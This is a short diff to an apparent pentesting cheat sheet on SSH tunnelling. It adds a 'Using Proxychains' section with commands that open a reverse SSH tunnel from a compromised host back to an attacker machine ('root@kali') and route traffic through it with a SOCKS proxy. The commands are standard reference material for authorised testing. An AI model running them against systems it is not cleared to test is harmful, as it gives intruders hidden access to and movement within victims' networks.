@@ -12,3 +12,12 @@ ssh user@target_ip -L $initiating_ip:$initiating_port:$target_ip:$target_port
 # Create a local SOCKS4 proxy
 # Example: ssh -D 8080 root@pwned.com
 ssh -D $local_proxy_port -p $remote_port $target
+
+## Using Proxychains
+# Create a reverse SSH tunnel to attacker from compromised host
+ssh -f -N -R 2222:127.0.0.1:22 root@kali
+#  Create a dynamic application-level port forward on port 8080 on attacking machine
+ssh -f -N -D 127.0.0.1:8080 -p 2222 user@local
+# Set proxychains
+# /etc/proxychains.conf
+socks4 127.0.0.1 8080
